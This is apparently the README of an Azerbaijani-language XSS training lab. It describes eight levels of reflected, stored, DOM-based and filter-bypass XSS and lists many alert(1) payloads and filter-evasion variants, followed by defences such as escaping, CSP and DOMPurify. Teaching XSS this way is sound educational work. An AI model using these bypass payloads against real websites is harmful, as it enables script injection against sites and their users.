```markdown
# 🛡️ XSS Lab - Təlim Məqsədli Təhlükəsizlik Laboratoriyası

<div align="center">

![XSS Lab](https://img.shields.io/badge/XSS-Lab-green?style=for-the-badge)
![Level](https://img.shields.io/badge/Levels-8-blue?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-orange?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)

**Cross-Site Scripting (XSS) hücumlarını öyrənmək üçün interaktiv laboratoriya**

[Quraşdırma](#-quraşdırma) • [Səviyyələr](#-səviyyələr) • [Payloadlar](#-payloadlar) • [Müdafiə](#-müdafiə-texnikaları)

</div>

---

## 📋 Mündəricat

- [Haqqında](#-haqqında)
- [Xüsusiyyətlər](#-xüsusiyyətlər)
- [Quraşdırma](#-quraşdırma)
- [İstifadə](#-istifadə)
- [Səviyyələr](#-səviyyələr)
- [Payloadlar](#-payloadlar)
- [Öyrənilən Mövzular](#-öyrənilən-mövzular)
- [Müdafiə Texnikaları](#-müdafiə-texnikaları)
- [Qeydlər](#-qeydlər)
- [Əlaqə](#-əlaqə)

---

## ℹ️ Haqqında

Bu layihə **Cross-Site Scripting (XSS)** təhlükəsizlik zəifliklərini öyrənmək və təcrübə qazanmaq üçün hazırlanmış interaktiv bir təlim platformasıdır. Layihə tamamilə təlim məqsədlidir və etik hackerlik bacarıqlarını inkişaf etdirmək üçün nəzərdə tutulmuşdur.

### ⚠️ Vacib Xəbərdarlıq

> **Bu laboratoriya yalnız təlim məqsədlidir.** Öyrəndiyiniz bilikləri yalnız icazə verilmiş sistemlərdə və qanuni çərçivədə istifadə edin. İcazəsiz sistemlərə daxil olmaq cinayətdir.

---

## ✨ Xüsusiyyətlər

- 🎮 **8 Fərqli Səviyyə** - 4 əsas kateqoriyada 2-şər alt səviyyə
- 📚 **Addım-addım Öyrənmə** - Hər səviyyə əvvəlkini bitirmədən açılmır
- 💡 **İpucları** - Hər səviyyədə köməkçi məlumatlar
- 🏆 **Proqres Sistemi** - İrəliləyişinizi localStorage ilə izləyin
- 🎨 **Müasir Dizayn** - Göz yormayan, qaranlıq tema
- 📱 **Responsive** - Mobil və desktop uyumlu
- 💾 **Server-siz** - Heç bir quraşdırma lazım deyil, birbaşa işləyir
- 🎯 **Real XSS Ssenarilər** - Real dünya nümunələri

---

## 🚀 Quraşdırma

### Variant 1: GitHub-dan Yükləmə (Tövsiyə olunan)

```bash
# Repozitorini klonlayın
git clone https://github.com/ibrahimovws/xss-lab.git

# Qovluğa daxil olun
cd xss-lab

# index.html faylını brauzerdə açın
# Heç bir server lazım deyil - birbaşa işləyir!
```

### Variant 2: Birbaşa Yükləmə

1. Repozitorinin **Code** → **Download ZIP** ilə ZIP faylını yükləyin
2. Arxivdən çıxarın
3. `index.html` faylını istənilən brauzerdə açın

### Variant 3: Live Server (VS Code)

```bash
# VS Code istifadə edirsinizsə:
# 1. "Live Server" extension yükləyin
# 2. index.html faylına sağ klikləyin
# 3. "Open with Live Server" seçin
```

---

## 📖 İstifadə

### Başlanğıc

1. **index.html** faylını brauzerdə açın
2. **"LABORATORIYA"** düyməsini klikləyin
3. Level 1.1 avtomatik açılacaq
4. Verilən tapşırığı yerinə yetirin (XSS payload-u yazın)
5. Uğur qazandıqdan sonra təbrik mesajı görünəcək və növbəti səviyyə açılacaq

### Necə İşləyir?

Hər səviyyədə sizdən XSS payload-u yazmaq tələb olunur. Məsələn:

```html
<!-- Axtarış sahəsinə yazın: -->
<img src=x onerror=alert(1)>
```

Əgər düzgündürsə:
- ✅ `alert(1)` işə düşəcək
- ✅ Təbrik mesajı görünəcək (izah ilə birlikdə)
- ✅ Növbəti səviyyə avtomatik açılacaq

---

## 🎮 Səviyyələr

### 📍 Level 1: Reflected XSS

**1.1 - Sadə Reflected XSS**
- **Məqsəd**: Input sahəsinə XSS payload-u yazın
- **Hədəf**: `innerHTML` ilə birbaşa render
- **Payload**: `<img src=x onerror=alert(1)>`
- **Alternativ**: `<script>alert(1)</script>`

**1.2 - URL Reflected XSS**
- **Məqsəd**: URL parametrindən istifadə edin
- **Hədəf**: `?name=` parametri
- **Payload**: `?name=<script>alert(1)</script>`
- **Alternativ**: `?name=<img src=x onerror=alert(1)>`

---

### 💾 Level 2: Stored XSS

**2.1 - Comment Stored XSS**
- **Məqsəd**: Şərh bölməsinə XSS əlavə edin
- **Hədəf**: localStorage-da saxlanılan məlumat
- **Payload**: `<svg onload=alert(1)>`
- **Qeyd**: Səhifə hər yüklənəndə işləyir (persistent)

**2.2 - Profile Stored XSS**
- **Məqsəd**: Profil məlumatlarına XSS əlavə edin
- **Hədəf**: Ad və ya Bio sahələri
- **Payload**: `<img src=x onerror=alert(1)>`
- **Alternativ**: `<svg onload=alert(1)>`

---

### 🌐 Level 3: DOM XSS

**3.1 - Hash-based DOM XSS**
- **Məqsəd**: URL hash-dən istifadə edin
- **Hədəf**: `location.hash`
- **Payload**: `#<img src=x onerror=alert(1)>`
- **Alternativ**: `#<script>alert(1)</script>`

**3.2 - document.write XSS**
- **Məqsəd**: document.write zəifliyindən istifadə edin
- **Hədəf**: iframe içində document.write
- **Payload**: `<script>alert(1)</script>`
- **Alternativ**: `<img src=x onerror=alert(1)>`

---

### 🔓 Level 4: Filter Bypass

**4.1 - Script Tag Bloklanıb**
- **Məqsəd**: `<script>` filtresini bypass edin
- **Hədəf**: Digər HTML tag-ləri
- **Payload**: `<svg onload=alert(1)>`
- **Alternativlər**:
  - `<img src=x onerror=alert(1)>`
  - `<body onload=alert(1)>`
  - `<input onfocus=alert(1) autofocus>`
  - `<details open ontoggle=alert(1)>`

**4.2 - Çoxsaylı Filter-lər** ⭐
- **Məqsəd**: Regex filter-lərini bypass edin
- **Filter**: `<script`, `on*=`, `javascript:` bloklanıb
- **Payload**: `<svg/onload=alert(1)>`
- **Alternativlər**:
  - `<img/src=x onerror=alert(1)>`
  - `<svg><animate onbegin=alert(1)>`
  - `<img src=x onerror =alert(1)>` (boşluq ilə)
  - `<details open ontoggle=alert(1)>`
  - `<marquee onstart=alert(1)>`

---

## 💉 Payloadlar

### Ümumi XSS Payloadları

```html
<!-- Əsas Payloadlar -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Event Handler-lər -->
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>

<!-- SVG İlə -->
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1)>

<!-- URL İlə -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- Encoding İlə -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

### Filter Bypass Texnikaları

```html
<!-- Boşluq Bypass -->
<img/src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Böyük/Kiçik Hərf -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;

<!-- Null Byte -->
<img src=x onerror=alert(1)>

<!-- Newline -->
<img src=x onerror=
alert(1)>
```

---

## 📚 Öyrənilən Mövzular

### 1. Reflected XSS
- ✅ Input-ların təhlükəsiz şəkildə işlənməməsi
- ✅ URL parametrlərinin təhlükələri
- ✅ Search funksiyalarının zəiflikləri
- ✅ Form inputlarının təhlükəsizliyi

### 2. Stored XSS
- ✅ Verilənlər bazasına XSS saxlama
- ✅ Şərh və profil sistemləri
- ✅ Persistent (davamlı) XSS
- ✅ localStorage təhlükələri

### 3. DOM XSS
- ✅ Client-side təhlükəsizlik
- ✅ location.hash istifadəsi
- ✅ document.write təhlükələri
- ✅ innerHTML zəiflikləri

### 4. Filter Bypass
- ✅ Blacklist vs Whitelist
- ✅ Regex bypass texnikaları
- ✅ Encoding və obfuscation
- ✅ Event handler bypass

---

## 🛡️ Müdafiə Texnikaları

### 1. Input Validation

```javascript
// ❌ YANLIŞ - Təhlükəsiz deyil
element.innerHTML = userInput;

// ✅ DOĞRU - Təhlükəsiz
element.textContent = userInput;
```

### 2. Output Encoding

```javascript
// XSS karakterlərini encode edin
function escapeHTML(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  };
  return str.replace(/[&<>"']/g, m => map[m]);
}

// İstifadə
element.textContent = escapeHTML(userInput);
```

### 3. Content Security Policy (CSP)

```html
<!-- Meta tag ilə -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'">

<!-- HTTP Header ilə -->
Content-Security-Policy: default-src 'self'
```

### 4. Sanitization (DOMPurify)

```javascript
// DOMPurify kitabxanası istifadə edin
const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;

// CDN ilə
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.5/purify.min.js"></script>
```

### 5. HTTPOnly Cookies

```javascript
// Server tərəfində
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 6. Framework-lərin Təhlükəsiz Xüsusiyyətləri

```javascript
// React - avtomatik escape edir
<div>{userInput}</div> // Təhlükəsiz

// Vue - avtomatik escape edir
{{ userInput }} // Təhlükəsiz

// Angular - avtomatik sanitization
{{ userInput }} // Təhlükəsiz
```

---

## 📝 Qeydlər

### 👨💻 Müəllif Haqqında

Salam! Mən **Web Developer**əm. Bu mənim **ilk təhlükəsizlik laboratoriyam** və ilk açıq mənbə layihəmdir.

> 💭 **Şəxsi Qeyd**: Bu layihə öyrənmə və təcrübə qazanmaq məqsədilə hazırlanmışdır. Ola bilsin ki, bəzi səhvlər, çatışmazlıqlar və ya təkmilləşdirilməli yerlər olsun. Əgər hər hansı problem tapsanız, təklifiniz olsa və ya kömək etmək istəsəniz, çox məmnuniyyətlə qəbul edirəm! Birlikdə daha yaxşı edə bilərik. 💪

### 🔧 Gələcək Təkmilləşdirmələr

Gələcək versiyalarda əlavə etmək istədiyim xüsusiyyətlər:

- [ ] Blind XSS səviyyələri (xss.report, ezXSS)
- [ ] CSP bypass texnikaları
- [ ] WAF (Web Application Firewall) bypass nümunələri
- [ ] Mutation XSS (mXSS)
- [ ] DOM clobbering nümunələri
- [ ] Prototype pollution
- [ ] Daha çox real dünya ssenarisi
- [ ] Video dərslər və izahlar
- [ ] Çoxdilli dəstək (EN, AZ, RU)
- [ ] Scoreboard sistemi
- [ ] Hints sistemi (xal ilə)

### 🤝 Necə Kömək Ola Bilərsiniz?

Əgər layihəyə kömək etmək istəyirsinizsə:

1. **Bug Report**: Problem tapsanız, GitHub-da Issue açın
2. **Feature Request**: Yeni xüsusiyyət təklif edin
3. **Pull Request**: Kod göndərin, birlikdə təkmilləşdirək
4. **Documentation**: README-ni təkmilləşdirin
5. **Share**: Layihəni paylaşın və star verin ⭐

---

## 📞 Əlaqə

### GitHub

- **Profil**: [ibrahimovws](https://github.com/ibrahimovws)
- **Layihə**: [XSS Lab](https://github.com/ibrahimovws/xss-lab)
- **Issues**: [Problem Bildir](https://github.com/ibrahimovws/xss-lab/issues)

### Əlaqə

Əgər sualınız, təklifiniz və ya problem varsa:

- 🐛 **Issue açın**: [GitHub Issues](https://github.com/ibrahimovws/xss-lab/issues)
- 🔄 **Pull Request**: [Kod göndərin](https://github.com/ibrahimovws/xss-lab/pulls)
- ⭐ **Star verin**: Layihəni bəyənirsinizsə star verməyi unutmayın!

---

## 📚 Əlavə Resurslar

### Öyrənmək Üçün

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Lab](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Game by Google](https://xss-game.appspot.com/)
- [PayloadAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

### Alətlər

- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [XSSer](https://xsser.03c8.net/)
- [BeEF](https://beefproject.com/)

---

## 📄 Lisenziya

Bu layihə **MIT License** ilə lisenziyalaşdırılmışdır. Təlim məqsədlidir və açıq mənbəlidir. İstifadə, dəyişdirmə və paylamaq azaddır.

```
MIT License

Copyright (c) 2026 ibrahimovws

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

<div align="center">

### 🎯 Uğurlar! XSS dünyasına xoş gəlmisiniz! 🎯

**Təhlükəsiz kod yazın, təhlükəsiz qalın!** 🔒

Made with ❤️ by [ibrahimovws](https://github.com/ibrahimovws)

⭐ **Star verməyi unutmayın!** ⭐

</div>
```